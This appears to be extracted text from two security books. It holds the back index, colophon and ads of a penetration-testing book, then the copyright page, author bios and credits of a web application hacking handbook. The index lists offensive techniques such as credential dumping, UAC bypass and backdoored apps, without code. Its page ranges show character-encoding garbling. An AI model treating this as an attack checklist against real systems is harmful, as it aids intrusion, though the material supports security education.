nslookup, 116‚Äì117, 167
NT LAN Manager (NTLM) hash, for 
password hash, 208
cracking with John the Ripper, 
210‚Äì211
O
offset
generating cyclical pattern to 
determine, 385‚Äì388
verifying, 388‚Äì389, 390
Opcode field, in TFTP, 423
open relay, 249
open source intelligence (OSINT), 4
DNS reconnaissance, 116‚Äì118
Maltego, 119‚Äì123
Netcraft, 114‚Äì115
port scanning, 123‚Äì131
searching for email addresses, 
118‚Äì119
whois lookups, 115‚Äì116
Open Sourced Vulnerability Database 
(OSVDB), 149
Open Web Application Security Project 
(OWASP), 335
open wireless network, 343
OSINT. See open source intelligence 
OSVDB (Open Sourced Vulnerability 
Database), 149
output format, for Msfvenom, 104‚Äì105
overflowtest.c file, functions in, 375
OWASP (Open Web Application 
Security Project), 335
owner, permissions for, 62
P
pack method (Ruby), 435
packages, managing installed, 66
Packet Storm Security, 88
pairwise master key (PMK), in WPA/
WPA2, 352
pairwise transient key (PTK), 352
pass the hash technique, 298‚Äì299
passphrase, for WPA or WPA2, 353
password attacks, 197‚Äì214
offline, 203‚Äì213
online, 198‚Äì203
password hashes
converting to plaintext, 203
for domain users, 302
dumping with physical access, 
206‚Äì208
example, 211
LM vs. NTLM algorithms, 208
recovering from Windows SAM file, 
204‚Äì206
reversing, 203, 298
passwords
cracking with John the Ripper, 210
cracking Linux, 212
default root for SSH, 453
dumping plaintext with WCE, 
213‚Äì214
guessing with Hydra, 202‚Äì203
lists of, 199‚Äì201
managing, 197‚Äì198
for Nessus, 20
online services for cracking, 213
recovering MD5 hashes, 188
saving, 293
setting in Windows 7 target 
machine, 49
setting in Windows XP, 37
strong, 198
system hashes, 194
use of same on multiple systems, 296
PATH environmental variable, 77
pattern matching, with awk, 66
488 Index
paused process, Immunity Debugger 
and, 381‚Äì382
payloads, 180‚Äì181
avoiding special characters, 396
creating standalone with Msfvenom, 
103‚Äì107
handler for, 227
listing in Msfvenom, 104
in Msfcli, 102‚Äì103
serving, 105
setting manually, 99‚Äì101
for structured exception handler 
overwrite, 418‚Äì419
payment terms, 3
PBKDF2 hashing algorithm, 352
PDF (Portable Document Format) 
software, exploitation with, 
225‚Äì235
penetration testing
basics, 1‚Äì2
data, tracking, 125‚Äì126
stages, 2‚Äì6
Penetration Testing Execution Standard 
(PTES), 2
Perl scripting language
for creating argument string, 376
string generation by, 372
persistence, 309‚Äì311
persistence script (Meterpreter), 310‚Äì311
personal connection process, in WPA/
WPA2, 351
phishing attack, 244
via email, automating, 253
phpMyAdmin, 149‚Äì150
exploitation, 186‚Äì188
ping command, 17, 38
limiting number of times, 78
stopping, 39
ping sweep, script for, 76
pipe (|), 65
pivoting, 304‚Äì308
through mobile devices, 466‚Äì470
Socks4a and ProxyChains, 307‚Äì308
plaintext
converting hashes to, 203
for credentials, 174
dumping passwords with Windows 
Credential Editor, 213‚Äì214
PMK (pairwise master key) in WPA/
WPA2, 352
POP instruction, 363, 411‚Äì412
reliance on location, 440
port 4444, 98
port scanning, 123‚Äì131
manual, 124
in Metasploit, 306
with Nmap, 125‚Äì131, 467‚Äì468
with Python script, 82
Portable Document Format (PDF) 
software, exploitation with, 
225‚Äì235
porting public exploits, 427‚Äì432
ports, 69, 95
default, for Simple Mail Transfer 
Protocol (SMTP), 124
exploring, 151‚Äì152
Netcat for connecting to, 152
Nmap port scanning for specific, 
130‚Äì131
post-exploitation phase of penetration 
testing, 2, 4‚Äì5, 277‚Äì311
gathering credentials, 292‚Äì294
keylogging, 292
lateral movement, 296‚Äì304
local information gathering, 291‚Äì296
local privilege escalation, 283‚Äì291
Metasploit modules, 281‚Äì283
Meterpreter for, 278‚Äì280
mobile, 463‚Äì471
modules, 281‚Äì283
persistence in, 309‚Äì311
pivoting, 304‚Äì308
PostgreSQL database, 88
post/windows/gather/enum_logged_on_users 
module, 282
post/windows/gather/hashdump 
module, 298
Powershell, in Windows 7, 329
pre-engagement phase of penetration 
testing, 2‚Äì4
print command 
Perl, 372
Python, 83
printf function, 84
private SSH keys, 194
privilege escalation, in mobile devices, 
470‚Äì471
privileged commands, running, 59
PRNG (pseudorandom number 
generator), 267, 345
processes, 67
Immunity Debugger and paused, 
381‚Äì382
Index 489
programming, 75‚Äì85. See also Bash 
scripts; Python
breakpoints in, 368
C programs, 84‚Äì85
Ruby, for Metasploit modules, 432
proprietary data, loss of, 2
protocol analyzer. See also Wireshark
ProxyChains, 307‚Äì308
ps aux command, 290
ps command (Meterpreter), 67, 295
PSExec technique, 296‚Äì297, 298
pseudorandom number generator 
(PRNG), 267, 345
PTES (Penetration Testing Execution 
Standard), 2
PTK (pairwise transient key), 352
public exploits
porting, 427‚Äì432
risks of working with, 142
public SSH key, 194
publisher, trusted vs. unknown, 235
PUSH ESP instruction, 393
PUSH instruction, 363, 411
pwd command, 56
Python, 81
connecting to a port, 83
Ctypes library, 271
if statements, 83
installing, 46
porting exploit, 436
variables in, 82
VirtualAlloc injection, 271
Python-generated executables, creating 
encrypted with Veil-Evasion, 
270‚Äì274
Q
QR (quick response) codes, 447
query, Wireshark capture of, 166
R
RADIUS (Remote Authentication 
Dial-In User Service) 
server, 351
Radmin Viewer program, trojan 
and, 259
radmin.exe binary, embedding payload 
inside, 259
Railgun, 283
rainbow tables, 213
random variable, 267
randomize_va_space, 364‚Äì365
rand_text_english function (Metasploit), 
435, 438
Rapid7, 87
raw_input function (Python), 82
RC4 (Rivest Cipher 4) stream 
cipher, 343
Rcrack tool, 213
read (r) permissions, 62
Ready to Create Virtual Machine 
dialog, 30
redirecting input, > symbol for, 61
reflective DLL injection, 181
reflective XSS attacks, 329
checking for vulnerability, 330
registers
in Intel-based CPU, 362‚Äì363
jumping to, 392
relative path, 56
remote attacks, 453‚Äì454
Remote Authentication Dial-In 
User Service (RADIUS) 
server, 351
remote control
of mobile devices, 465‚Äì466
USSD, 456‚Äì457
remote file inclusion, for web 
application testing, 327
remote system
logging into, 298
pinging, 76
removing files, 60
reporting phase of penetration testing, 
2, 5‚Äì6
researching vulnerabilities, 142
resource exhaustion attack, 471
RET instruction, 411‚Äì412
reliance on location, 440
return address, 363
finding, 429‚Äì430
using from executable module, 394
return statement (C), 85
return-oriented programming 
(ROP), 441
rev2self command (Meterpreter), 284
reverse shells, 71, 98‚Äì99, 180
reverse_https_proxy payload 
(Meterpreter), 218
RHOST option, for Metasploit module, 
94‚Äì95
risk profile, 5
risks of public exploit code, 88
490 Index
Rivest Cipher 4 (RC4) stream 
cipher, 343
rm file command, 60
rockyou.txt.gz file, 200
root privileges, 56, 194, 287‚Äì291
root@kali# prompt, 56
ROP (return-oriented 
programming), 441
route command (Metasploit), 68, 
305‚Äì306
router, for wireless traffic, 339
RPORT option, for Metasploit module, 95
RtlMovememory API, 271
Ruby, for Metasploit modules, 432
run migrate command (Meterpreter), 280
running processes, viewing, 67
S
SafeSEH, 412‚Äì416
SAM (Security Accounts Manager) file
downloading, 189
recovering password hashes from, 
204‚Äì206
Samdump2, 205
saving
passwords, 293
text to file, 61
SCADA systems, 131
scanner/portscan/tcp module, 306
scanning
legality of, 124
with w3af, 335‚Äì337
web application, 148‚Äì151
scope of pentest, 3
scripts. See also Bash scripts; Python
running automatically, 72
running in Meterpreter, 223
running on target web server, 183
search command (Meterpreter), 
291‚Äì292
searching
Metasploit auxiliary module and 
exploit database, 91
for text, 63
searchsploit utility, 288
Secure Socket Layer (SSL) attacks, 
170‚Äì172
stripping attacks, 173‚Äì174
Security Accounts Manager file. See
SAM (Security Accounts 
Manager) file
security updates, turning off 
automatic, 34
SecurityFocus.com, 88, 380, 427
sed command, 65
to delete final character from each 
line, 81
SEH chain, 401
viewing, 402
SEH overwrites. See structured 
exception handler 
overwrites
SEH registration record, 401
Select Guest Operating system 
dialog, 29
self-signed SSL certificates, social 
engineering tests with, 173
sensitive files, downloading, 188‚Äì189
service command, 67
services, 67
session, bringing to foreground, 283
SET (Social-Engineer Toolkit), 235, 
244‚Äì245
spear-phishing attacks, 245‚Äì250
set payload command (Metasploit), 99
setoolkit command, 245
shell command, for dropping out of 
Meterpreter, 287
shell scripts, 75
shellcode
Msfvenom for generating, 273‚Äì274, 
428
replacing, 430
shellcode variable, in custom C code, 267
shells, 395‚Äì400
closing, 100
types of, 98‚Äì99
shikata_ga_nai encoder, 264
short jump assembly instruction, 
416‚Äì417
show advanced command 
(Metasploit), 223
show options command (Metasploit), 94, 
96, 99
show payloads command (Metasploit), 
96‚Äì97, 180, 190‚Äì191, 
216‚Äì218
show targets command (Metasploit), 
95‚Äì96, 234
signatures
for antivirus applications, 438
for apps, 462
signed Java Applet, 233‚Äì235
Index 491
Simple Mail Transfer Protocol (SMTP), 
default port for, 124
skins in Winamp, malicious code in, 
239‚Äì240
slash (/), as delimiter character in 
sed, 65
SLMail 5.5, downloading and 
installing, 41‚Äì42
Smartphone Pentest Framework (SPF), 
445, 447‚Äì452
Android emulators, 449
attaching app, 452
attaching to deployed agent, 
460‚Äì461
attaching mobile modem, 449
backdooring APKs, 461‚Äì464
building Andoid app, 449‚Äì450
creating malicious agents, 458‚Äì463
downloading and installing, 27‚Äì28
running exploit through agent, 468
setting up, 447‚Äì449
starting, 448
SMB capture, 302‚Äì304
SMBPIPE option, for Metasploit 
module, 95
SMS, for spam and phishing attacks, 446
SMTP (Simple Mail Transfer Protocol), 
default port for, 124
Social-Engineer Toolkit (SET), 235, 
244‚Äì245
spear-phishing attacks, 245‚Äì250
social engineering, 243‚Äì255
mass email attacks, 253‚Äì255
multipronged attacks, 255
tests, with self-signed SSL 
certificates, 173
web attacks, 250‚Äì252
socket library, 82
Socks4a, 307‚Äì308
software
installing vulnerable, 40‚Äì47
investigating running, for 
vulnerabilities, 295
user account for, 58
versions in banners, 124
source code, backdooring, 458‚Äì461
spear-phishing attacks, 245‚Äì250
choosing a payload, 246‚Äì247
listener setup, 249‚Äì250
naming malicious file, 247
setting options, 247
setting target, 248‚Äì249
single vs. mass email, 247‚Äì248
template for, 248
special characters, avoiding for 
payload, 396
Specify Disk Capacity dialog, 30
SPF. See Smartphone Pentest 
Framework (SPF)
SQL commands, executing, 186
SQL injection, 319‚Äì322
SQLMap, 321‚Äì322
SRVHOST option, 220
SSH, default root password, 453
.ssh directory, 194
vulnerability from access, 145‚Äì146
SSH Exec, 299‚Äì300
SSH key pair, generating, 195
ssh-add command, 195
ssh-keygen command, 195
SSL (Secure Socket Layer) attacks, 
170‚Äì172
stripping attacks, 173‚Äì174
SSL certificate, warning of invalid, 19
SSLstrip, 173‚Äì174
stack, 362, 363
following ESP register on, 408‚Äì409
as last-in, first-out (LIFO) 
structure, 411
stack-based buffer overflow in Linux, 
361‚Äì378
C program vulnerable to, 365‚Äì366
causing crash, 366‚Äì367, 372‚Äì373
EIP register control, 373‚Äì375
hijacking execution, 375‚Äì376
stack-based buffer overflow in 
Windows, 379‚Äì400
causing crash, 382‚Äì384
getting shell, 395‚Äì400
hijacking execution, 390‚Äì395
locating EIP register, 384‚Äì388
searching for known vulnerability 
in War-FTP, 380‚Äì382
stack buffer, 379
stack cookies, 439‚Äì440
staged payloads, 181
static analysis, 260
static IP address
setting, 38‚Äì39, 68‚Äì69
for Windows 7 target machine, 51
stdio library (C), 84
stealing stored credentials, 294
stopping keylogger, 292
stored XSS attacks, 329
492 Index
strategic road map, 6
strcpy function, 366‚Äì367, 422
string, generating with Perl script, 372
strong passwords, 198
structured exception handler (SEH) 
overwrites, 401‚Äì419
choosing payload, 418‚Äì419
exploits, 403‚Äì407
finding attack string in memory, 
408‚Äì411
replacing with POP POP RET, 414, 415
SafeSEH, 412‚Äì416
short jump assembly instruction, 
416‚Äì417
structured exception handler, passing 
control to, 407‚Äì408
su command, 59‚Äì60
sudo command, 59
sudoers file, 59
superuser (root) prompt, 16
switches, and traffic capture, 156
SYN scan, 125‚Äì127
Syskey utility, encryption key for, 
189, 205
system() command (PHP), 186
system password hashes, 194
system privileges, session running 
with, 297
T
Tabnabbing Attack Method, 251
target virtual machines, 28‚Äì29. See also
Windows 7 target machine, 
Windows XP target machine, 
Ubuntu 8.10 target machine
TCP connection
creating socket, 82
Netcat tool for, 69‚Äì72
three-way handshake, 125
TCP scan, 127
TCP stream, Wireshark for 
following, 159
technical report, 6
Temporal Key Integrity Protocol 
(TKIP), 350
Tenable Security, Nessus, 17, 134‚Äì142
testing window, 3
text
adding to file, 61
searching for, 63, 65
text messages, mobile hacking with, 446
text segment of memory, 362
TFTP (Trivial FTP) server
downloading file with, 187‚Äì188
fuzzing program, 424‚Äì426
packet, 435
packet format, 423
writing to file, 438
Thawte (certificate authority), 171
theHarvester (Python tool), 118‚Äì119
then statement, in Bash scripts, 78
third-party software, exploiting buffer 
overflow in, 190‚Äì191
third-party web applications, 
exploitation, 191‚Äì193
threat-modeling phase of penetration 
testing, 2, 4
TikiWiki CMS software, 191‚Äì192
TKIP (Temporal Key Integrity 
Protocol), 350
TLS (Transport Layer Security) 
encryption, 181
/tmp/run file (Linux), adding code to, 
290‚Äì291
token impersonation, 300‚Äì301
touch command, 60
tr utility (Linux), 267
training employees, about social 
engineering, 244
Transport Layer Security (TLS) 
encryption, 181
Trivial FTP server. See TFTP (Trivial 
FTP) server
trojans, 258‚Äì259
MD5 hash to check for, 260
TrustedSec, Social-Engineer 
Toolkit, 244
two-factor authentication, 198
U
UAC (user account control), 285‚Äì287
Ubuntu 8.10 target machine, 28. See 
also Linux
setup, 48
udev (device manager for Linux), 288
UDP scans, 128‚Äì130, 295
UDP socket, setting up, 435
uname command, 287
unstructured supplementary service 
data (USSD), 456‚Äì457
upload command (Meterpreter), 279
uploading, Msfvenom payload, 
183‚Äì185
URIPATH option, 221
Index 493
user account control (UAC), 285‚Äì287
user accounts
adding, 58‚Äì59
adding, persistence and, 309
adding to sudoers file, 59
creating in Windows, 35, 48‚Äì49
in Linux, 58
for logging in to FTP, 165
switching, 59‚Äì60
user lists, 199
user password. See passwords
user privileges, 58‚Äì61
USER32.dll, 429‚Äì430
usernames
finding, 118
finding valid, 153
guessing with Hydra, 202‚Äì203
users. See also social engineering
downloading payload by, 105
enticing to download and install 
Android agent, 460
listing all local, 294
logging keystrokes by, 292
sending messages to contacts, 465
/usr/share/exploitdb/platforms/linux/
local/8572.c exploit, 288‚Äì289
/usr/share/metasploit-framework/modules/
post/windows/gather/
credentials module, 292
USSD (unstructured supplementary 
service data), 456‚Äì457
V
variables, in Python, 82
Veil-Evasion, 270‚Äì274
available payloads, 272
installing, 21
Python VirtualAlloc in, 273
VeriSign (certificate authority), 171
version scan, 127‚Äì128
Very Secure FTP (Vsftpd) 2.3.4, 
133‚Äì134, 193‚Äì194, 258
vi (file editor), 62
editing file, 63
virtual lab setup, 9‚Äì54
installing VMware, 9‚Äì10
installing vulnerable software, 
40‚Äì47
Kali Linux setup, 10‚Äì28
target virtual machines, 28‚Äì29
Ubuntu 8.10 target machine, 48
Windows 7 target machine, 48‚Äì54
Windows XP target machine, 
29‚Äì40
Virtual Machine Settings dialog, 15
virtual machines
configuring network for, 13‚Äì17
connecting to network, 16‚Äì17
to delay booting, 207
target, 28‚Äì29
virtual networks, and traffic 
capture, 156
VirtualAlloc injection method, 271
VirusTotal, 262‚Äì263
results for encoded binary, 265
VMware, installing, 9‚Äì10
VMware Fusion (Mac OS), 10, 16, 31‚Äì32
installing VMware Tools for, 36
VMware Player (Windows), 9‚Äì10, 
14‚Äì15, 35‚Äì36
installing Windows XP on, 29‚Äì31
VMware Tools
installing on Windows XP target 
machine, 35‚Äì36
installing on Windows 7 target 
machine, 48, 50
VMware Workstation, 10
.vmx configuration file, 207
VRFY SMTP command, 153
Vsftpd (Very Secure FTP) 2.3.4, 
133‚Äì134, 193‚Äì194, 258
vulnerabilities, 133‚Äì153
in Java, 230‚Äì233
manual analysis, 151‚Äì153
researching, 142
searching for known, in War-FTP, 
380‚Äì382
web application scanning, 148‚Äì151
vulnerability analysis phase of 
penetration testing, 2, 4
vulnerability repository, 149
vulnerability scanners
Nessus Home, 17
reasons to use, 141
vulnerable software, installing, 40‚Äì47
W
w3af (Web Application Attack and 
Audit Framework), 335‚Äì337
War-FTP
crashing, 397‚Äì398, 403
downloading and installing, 46
Python exploit to crash, 383
494 Index
War-FTP (continued)
searching for known vulnerability 
in, 380‚Äì382
USER buffer overflow, 439
warning, for PDF embedded 
executable, 229
Warning: system() [function.system]: 
Cannot execute a blank 
command in... message, 187
WCE (Windows Credential Editor), 
213‚Äì214
Web Application Attack and Audit 
Framework (w3af), 335‚Äì337
web application testing, 313‚Äì337
with Burp Proxy, 314‚Äì319
command execution, 327‚Äì329
cross-site request forgery, 335
cross-site scripting (XSS), 329‚Äì335
local file inclusion, 324‚Äì327
remote file inclusion, 327
scanning with w3af, 335‚Äì337
signing up for account, 317‚Äì318
SQL injection, 319‚Äì322
XPath injection, 323‚Äì324
web applications
access to server-side source 
code, 326
third-party, exploitation, 191‚Äì193
vulnerability scanning, 148‚Äì151
web browsers. See browsers
web server
copying app to, 451
running script on target, 183
web server software, system privileges 
and, 185
WebDAV (Web Distributed Authoring 
and Versioning) 
software, 150
exploiting default credentials, 
182‚Äì183
WebEx, Java for, 241
WebKit package, attacking, 454‚Äì456
websites, for wordlists, 200
WEP. See wired equivalent 
privacy (WEP)
wget command, 289
whoami command, 71, 291
whois lookups, 115‚Äì116
Wi-Fi protected access (WPA), 350
Wi-Fi Protected Setup (WPS), 356‚Äì357
Wifite tool, 350, 356
Winamp
installing, 52
replacing configuration file for, 
237‚Äì239
Windows
APIs, Railgun for accessing, 283
clipboard, stealing data from, 334
firewall
and response to ping, 51
turning off, 37
Security Accounts Manager 
(SAM) file
downloading, 189
recovering password hashes 
from, 204‚Äì206
Service Control Manager, remote 
procedure call (RPC), 296
Syskey utility, 189
VMware Player, 9‚Äì10, 14‚Äì15
Windows 7 target machine, 48‚Äì54
adding second network interface, 52
bypassing UAC on, 285‚Äì287
creating user account, 48‚Äì49
dumping hashes with physical 
attack, 206‚Äì207
installing additional software, 
52‚Äì54
opting out of automatic updates, 50
Powershell in, 329
turning off real-time protection, 53
Windows 2000, LM hashes storage, 211
Windows Credential Editor (WCE), 
213‚Äì214
Windows XP target machine, 28
activating, 34
creating, 29‚Äì40
installing, 32‚Äì35
LM hashes storage, 211
local privilege escalation, 284‚Äì285
Nessus detection of 
vulnerabilities, 139
setup to behave as member of 
Windows domain, 39‚Äì40
windows/local/bypassuac exploit, 286
windows/meterpreter/bind_tcp payload, 307
windows/meterpreter/reverse_tcp payload, 
247, 265, 273‚Äì274
windows/smb/ms08_067_netapi
module, 306
WinSCP, 292‚Äì294
downloading and installing, 46
Index 495
wired equivalent privacy (WEP), 
343‚Äì350
challenges, 350
cracking keys with Aircrack-ng, 
347‚Äì350
weaknesses, 346
wireless attacks, 339‚Äì357
capturing packets, 342‚Äì343
scanning for access points, 341
setup, 339‚Äì341
viewing available interfaces, 
340‚Äì341
Wi-Fi protected access, 350
Wi-Fi Protected Setup (WPS), 
356‚Äì357
wired equivalent privacy (WEP), 
343‚Äì350
WPA2, 351‚Äì356
wireless network
monitor mode, 341‚Äì342
open, 343
Wireshark, 156‚Äì160
capturing traffic, 156‚Äì158
dissecting packets, 160
filtering traffic, 158‚Äì159
following TCP stream, 159
for viewing WPA2 handshake, 355
wordlists for passwords, 199‚Äì201
Workgroup settings, for Windows XP, 33
WPA (Wi-Fi protected access), 350
WPA2, 351‚Äì356
cracking keys, 353‚Äì356
dictionary attack against, 356
enterprise connection process, 351
four-way handshake, 352‚Äì353
personal connection process, 351
WPS (Wi-Fi Protected Setup), 356‚Äì357
write (w) permissions, 62
X
x/16xw $esp command (GDB), 369
XAMPP
Apache, default install location, 186
attacking, 149‚Äì150
default credentials, 150‚Äì151
default login credentials for 
WebDav, 182
installing, 43‚Äì45
starting control panel, 43
XML
attacks on, 323‚Äì324
usernames and passwords in, 326
Xpath, 320
injection, 323‚Äì324
xp_cmdshell() function, 188
xp_cmdshell stored procedure, 322
xphashes.txt file, 210
XSS (cross-site scripting), 329‚Äì335
checking for reflective 
vulnerability, 330
leveraging with BeEF, 331‚Äì335
Z
zero-day vulnerability, 220, 240
Zervit server, 40‚Äì41
crashes from Nmap scan, 130, 131
zone transfers, DNS, 117‚Äì118

Penetration Testing is set in New Baskerville, TheSansMono Condensed, 
Futura, and Dogma. The book was printed and bound by Sheridan Books, 
Inc. in Chelsea, Michigan. The paper is 60# Finch Offset, which is certified 
by the Forest Stewardship Council (FSC). 
The book uses a layflat binding, in which the pages are bound together 
with a cold-set, flexible glue and the first and last pages of the resulting 
book block are attached to the cover. The cover is not actually glued to the 
book‚Äôs spine, and when open, the book lies flat and the spine doesn‚Äôt crack.

Updates
Visit http://nostarch.com/pentesting/ for updates, errata, and other 
information.
phone:
800.420.7240 or
415.863.9900
email:
sales@nostarch.com
web:
www.nostarch.com
Android Security Inter
An In-Depth Guide to Androi
Security Architectu
by nikolay elenkov
september 2014, 384 pp., $49.95
isbn 978-1-59327-581-5
Metasploit
The Penetration Tester‚Äôs Gu
by david kennedy, jim o‚Äôgorman, 
devon kearns, and mati aharoni
july 2011, 328 pp., $49.95
isbn 978-1-59327-288-3
Practical Malware Analys
The Hands-On Guide to Dissecti
Malicious Softwar
by michael sikorski and
andrew honig
february 2012, 800 pp., $59.95
isbn 978-1-59327-290-6
Practical Packet Analys
2nd Editio
Using Wireshark to Solv
Real-World NetworkProblems by chris san
july 2011, 280 pp., $49.95
isbn 978-1-59327-266-1
The Practice of Netw
Security Monitor
Understanding Incident Detectio
and Respons
by richard bejtlich
july 2013, 376 pp., $49.95
isbn 978-1-59327-509-9
More no-nonsense books from No StarchP
Hacking, 2nd Editi
The Art of Exploitat
by jon erickson
february 2008, 488 pp. w/cd, $49.95
isbn 978-1-59327-144-2
Downloading the Software to Build Your Virtual Lab
You‚Äôll find links for the resources used in this book at http://www.nostarch.com/
pentesting/, including the custom web application, the Ubuntu target, and 
the Kali Linux virtual machine. Use the password 1stPentestBook?! to open the 
7-Zip archive containing the book‚Äôs resources. 
You can find 7-Zip programs for Windows and Linux platforms at http://
www.7-zip.org/download.html. Mac users can use Ez7z from http://ez7z.en.softonic
.com/mac/.
If you‚Äôre unable to download the files or you‚Äôd just like them delivered 
to your doorstep, we‚Äôll send you a DVD containing the files for US $10. 
Visit http://www.nostarch.com/pentesting/ for details.
You‚Äôll find additional resources at Georgia Weidman‚Äôs website: http://
bulbsecurity.com/.


--------------------------------------------------------------------------------


Stuttard fl ast.indd V2 - 08/10/2011 Page xxii
flast.indd xxii flast.indd xxii 8/19/2011 12:23:07 PM 8/19/2011 12:23:07 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page i
The Web Application 
Hacker‚Äôs Handbook
Second Edition
Finding and Exploiting Security Flaws
Dafydd Stuttard 
Marcus Pinto
ffirs.indd i ffirs.indd i 8/19/2011 12:22:33 PM 8/19/2011 12:22:33 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page ii
The Web Application Hacker‚Äôs Handbook: Finding and Exploiting Security Flaws, Second Edition
Published by
John Wiley & Sons, Inc.
10475 Crosspoint Boulevard
Indianapolis, IN 46256
www.wiley.com
Copyright ¬© 2011 by Dafydd Stuttard and Marcus Pinto
Published by John Wiley & Sons, Inc., Indianapolis, Indiana
Published simultaneously in Canada
ISBN: 978-1-118-02647-2
ISBN: 978-1-118-17522-4 (ebk)
ISBN: 978-1-118-17524-8 (ebk)
ISBN: 978-1-118-17523-1 (ebk)
Manufactured in the United States of America
10 9 8 7 6 5 4 3 2 1
No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or 
by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permitted 
under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright 
Clearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the 
Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 
River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at http://www.wiley.
com/go/permissions.
Limit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or warranties with respect to the accuracy or completeness of the contents of this work and specifi cally disclaim all 
warranties, including without limitation warranties of fi tness for a particular purpose. No warranty may be 
created or extended by sales or promotional materials. The advice and strategies contained herein may not 
be suitable for every situation. This work is sold with the understanding that the publisher is not engaged in 
rendering legal, accounting, or other professional services. If professional assistance is required, the services 
of a competent professional person should be sought. Neither the publisher nor the author shall be liable for 
damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation 
and/or a potential source of further information does not mean that the author or the publisher endorses 
the information the organization or website may provide or recommendations it may make. Further, readers 
should be aware that Internet websites listed in this work may have changed or disappeared between when 
this work was written and when it is read.
For general information on our other products and services please contact our Customer Care Department 
within the United States at (877) 762-2974, outside the United States at (317) 572-3993 or fax (317) 572-4002.
Wiley also publishes its books in a variety of electronic formats and by print-on-demand. Not all content 
that is available in standard print versions of this book may appear or be packaged in all book formats. If 
you have purchased a version of this book that did not include media that is referenced by or accompanies 
a standard print version, you may request this media by visiting http://booksupport.wiley.
com. For more information about Wiley products, visit us at www.wiley.com.
Library of Congress Control Number: 2011934639
Trademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc. 
and/or its affi liates, in the United States and other countries, and may not be used without written permission. 
All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated 
with any product or vendor mentioned in this book.
ffirs.indd ii ffirs.indd ii 8/19/2011 12:22:37 PM 8/19/2011 12:22:37 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page iii
iii
Dafydd Stuttard is an independent security consultant, author, and software 
developer. With more than 10 years of experience in security consulting, he 
specializes in the penetration testing of web applications and compiled software. Dafydd has worked with numerous banks, retailers, and other enterprises 
to help secure their web applications. He also has provided security consulting to 
several software manufacturers and governments to help secure their compiled 
software. Dafydd is an accomplished programmer in several languages. His 
interests include developing tools to facilitate all kinds of software security 
testing. Under the alias ‚ÄúPortSwigger,‚Äù Dafydd created the popular Burp Suite 
of web application hacking tools; he continues to work actively on Burp‚Äôs development. Dafydd is also cofounder of MDSec, a company providing training and 
consultancy on Internet security attack and defense. Dafydd has developed and 
presented training courses at various security conferences around the world, 
and he regularly delivers training to companies and governments. He holds 
master‚Äôs and doctorate degrees in philosophy from the University of Oxford.
Marcus Pinto is cofounder of MDSec, developing and delivering training 
courses in web application security. He also performs ongoing security consultancy for fi nancial, government, telecom, and retail verticals. His 11 years 
of experience in the industry have been dominated by the technical aspects of 
application security, from the dual perspectives of a consulting and end-user 
implementation role. Marcus has a background in attack-based security assessment and penetration testing. He has worked extensively with large-scale web 
application deployments in the fi nancial services industry. Marcus has been 
developing and presenting database and web application training courses since 
2005 at Black Hat and other worldwide security conferences, and for privatesector and government clients. He holds a master‚Äôs degree in physics from the 
University of Cambridge. 
About the Authors
ffirs.indd iii ffirs.indd iii 8/19/2011 12:22:37 PM 8/19/2011 12:22:37 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page iv
iv
About the Technical Editor
Dr. Josh Pauli received his Ph.D. in Software Engineering from North Dakota 
State University (NDSU) with an emphasis in secure requirements engineering 
and now serves as an Associate Professor of Information Security at Dakota 
State University (DSU). Dr. Pauli has published nearly 20 international journal and conference papers related to software security and his work includes 
invited presentations from the Department of Homeland Security and Black 
Hat Briefi ngs. He teaches both undergraduate and graduate courses in system 
software security and web software security at DSU. Dr. Pauli also conducts web 
application penetration tests as a Senior Penetration Tester for an Information 
Security consulting fi rm where his duties include developing hands-on technical workshops in the area of web software security for IT professionals in the 
fi nancial sector.
ffirs.indd iv ffirs.indd iv 8/19/2011 12:22:37 PM 8/19/2011 12:22:37 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page v
v
MDSec: The Authors‚Äô Company
Dafydd and Marcus are cofounders of MDSec, a company that provides training 
in attack and defense-based security, along with other consultancy services. If 
while reading this book you would like to put the concepts into practice, and 
gain hands-on experience in the areas covered, you are encouraged to visit our 
website, http://mdsec.net. This will give you access to hundreds of interactive 
vulnerability labs and other resources that are referenced throughout the book.
ffirs.indd v ffirs.indd v 8/19/2011 12:22:37 PM 8/19/2011 12:22:37 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page vi
vi
Executive Editor
Carol Long
Senior Project Editor
Adaobi Obi Tulton
Technical Editor
Josh Pauli
Production Editor
Kathleen Wisor
Copy Editor
Gayle Johnson
Editorial Manager
Mary Beth Wakefi eld 
Freelancer Editorial Manager
Rosemarie Graham
Associate Director of 
Marketing
David Mayhew
Marketing Manager
Ashley Zurcher
Business Manager
Amy Knies
Production Manager
Tim Tate
Vice President and Executive 
Group Publisher
Richard Swadley
Vice President and Executive 
Publisher
Neil Edde
Associate Publisher
Jim Minatel
Project Coordinator, Cover
Katie Crocker
Proofreaders
Sarah Kaikini, Word One
Sheilah Ledwidge, Word One
Indexer
Robert Swanson
Cover Designer
Ryan Sneed
Cover Image
Wiley InHouse Design
Vertical Websites Project Manager
Laura Moss-Hollister
Vertical Websites Assistant Project 
Manager
Jenny Swisher
Vertical Websites Associate 
Producers
Josh Frank
Shawn Patrick
Doug Kuhn
Marilyn Hummel
Credits
ffirs.indd vi ffirs.indd vi 8/19/2011 12:22:37 PM 8/19/2011 12:22:37 PM
Stuttard ffi rs.indd V4 - 08/17/2011 Page vii
vii
Acknowledgments
We are indebted to the directors and others at Next Generation Security Software, 
who provided the right environment for us to realize the fi rst edition of this 
book. Since then, our input has come from an increasingly wider community 
of researchers and professionals who have shared their ideas and contributed 
to the collective understanding of web application security issues that exists 
today. Because this is a practical handbook rather than a work of scholarship, 
we have deliberately avoided fi lling it with a thousand citations of infl uential 
